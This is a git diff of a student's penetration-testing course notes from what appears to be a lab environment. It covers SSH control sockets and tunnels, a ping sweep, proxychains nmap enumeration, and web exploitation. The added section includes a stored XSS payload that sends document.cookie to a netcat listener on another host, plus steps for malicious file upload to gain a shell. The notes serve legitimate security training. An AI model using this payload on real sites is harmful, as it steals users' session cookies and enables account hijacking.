@@ -17,7 +17,7 @@ favriout site for vulnerabilites: exploit-db, google the CVE # with github.
                                                                                         OP NOTES
 
 ##Control Sockets
-  ssh -MS /tmp/jump/ student@10.50.16.164        (M is multiplexing, to connect to multiple systems, S is socket created in /tmp directory)
+  ssh -MS /tmp/jump student@10.50.16.164        (M is multiplexing, to connect to multiple systems, S is socket created in /tmp directory)
 
 ##ping sweep from jump box
   for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done       from jump box we can only pingsweep
@@ -68,8 +68,51 @@ favriout site for vulnerabilites: exploit-db, google the CVE # with github.
                                                                                                         nmap --script-trace
   proxychains nmap --script=http-enum 192.168.28.100
 
+**************************************************************************************************************************************************************************************************************************
                                                                                             
-                                                                                          DAY 2
+                                                                                          DAY 2 Web exploitation
+
+GET requests can be ultlized to pass data to the server with this:         http://10.50.x.x/path/pathdemo.php?myfile=demo1           Where does this go? in the site bar on top
+
+
+                                                                                            OP NOTES
+ssh demo1@10.50.15.172 -L 9999:10.208.50.42:80
+
+stored XXS, open a listning port nc -lv 4444
+on site:
+<script>document.location="http://10.50.179.44:4444/?username=" + document.cookie;</script>      capture cookies
+                                                                  document.body.innerHTML          capture sensitive data
+
+using the script http-enum, we find files of interest to navigate to on the http search bar
+
+ssh-keygen -t rsa -b 4096     to generate you own keys in an .ssh file
+
+In order to Malicoius file upload we need
+  1. ability to upload to a server
+  2. know where we are uploading to
+  3. be able to get there to run commands on shell created
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
